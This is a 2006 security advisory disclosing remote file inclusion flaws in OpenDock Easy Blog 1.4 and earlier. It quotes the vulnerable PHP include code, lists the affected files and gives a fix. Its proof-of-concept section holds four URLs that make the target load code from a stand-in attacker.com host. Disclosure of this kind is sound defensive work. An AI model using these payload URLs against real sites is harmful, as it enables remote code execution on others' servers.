@@ -1,0 +1,98 @@
+ECHO_ADV_50$2006
+
+-----------------------------------------------------------------------------------------------
+[ECHO_ADV_50$2006]OpenDock Easy Blog <=1.4 (doc_directory) Multiple Remote File Inclusion Vulnerability
+-----------------------------------------------------------------------------------------------
+
+Author          : Dedi Dwianto a.k.a the_day
+Date Found      : October, 09th 2006
+Location        : Indonesia, Jakarta
+web             : http://advisories.echo.or.id/adv/adv50-theday-2006.txt
+Critical Lvl    : Highly critical
+Impact          : System access
+Where           : From Remote
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Application     : OpenDock Easy Blog
+version         : <=1.4
+URL             : http://web.opendock.net
+
+---------------------------------------------------------------------------
+
+Vulnerability:
+~~~~~~~~~~~~~
+
+In folder sw/lib_up_file/ I found vulnerability script file.php
+--------------------------file.php---------------------------------------
+....
+<?
+
+ include $doc_directory.$path_sw."lib_up_file/lib_file.php";
+ include $doc_directory.$path_sw."lib_up_file/lib_form_file.php";
+ include $doc_directory.$path_sw."lib_up_file/lib_read_file.php";
+ include $doc_directory.$path_sw."lib_up_file/lib_page_file.php";
+ include $doc_directory.$path_sw."lib_up_file/find_file.php";
+ include $doc_directory.$path_sw."lib_up_file/down_stat.php";
+
+...
+----------------------------------------------------------
+
+Input passed to the "$doc_directory" parameter in file.php is not
+properly verified before being used. This can be exploited to execute
+arbitrary PHP code by including files from local or external
+resources.
+
+Also affected files on Files:
+
+sw/lib_up_file/down_stat.php
+sw/lib_up_file/file.php
+sw/lib_up_file/find_file.php
+sw/lib_up_file/lib_read_file.php
+sw/lib_up_file/lib_form_file.php
+sw/lib_comment/find_comment.php
+sw/lib_comment/comment.php
+sw/lib_comment/lib_comment.php
+sw/lib_find/find.php
+etc..
+
+
+
+Proof Of Concept:
+~~~~~~~~~~~~~~
+
+http://target.com/[OpenDockEasyBlog_Path]/sw/lib_up_file/file.php?doc_directory=http://attacker.com/inject.txt?
+http://target.com/[OpenDockEasyBlog_Path]/sw/lib_up_file/find_file.php?doc_directory=http://attacker.com/inject.txt?
+http://target.com/[OpenDockEasyBlog_Path]/sw/lib_comment/comment.php?doc_directory=http://attacker.com/inject.txt?
+http://target.com/[OpenDockEasyBlog_Path]/sw/lib_find/find.php?doc_directory=http://attacker.com/inject.txt?
+
+Solution:
+~~~~~~
+- Sanitize variable $doc_directory on affected files.
+- Turn off register_globals
+
+Timeline:
+~~~~~~
+09 - 10 - 2006 Bugs Found
+09 - 10 - 2006 Vendor Contact
+09 - 10 - Public Disclosure
+
+---------------------------------------------------------------------------
+
+Shoutz:
+~~
+~ y3dips,moby,comex,z3r0byt3,K-159,c-a-s-e,S`to,lirva32,anonymous
+~ Jessy My Brain
+~ az001,boom_3x,mathdule,angelia
+~ newbie_hacker@yahoogroups.com
+~ #aikmel - #e-c-h-o @irc.dal.net
+------------------------------------------------------------------------
+---
+Contact:
+~~~
+    EcHo Research & Development Center
+    the_day[at]echo[dot]or[dot]id
+
+# milw0rm.com [2006-10-09]
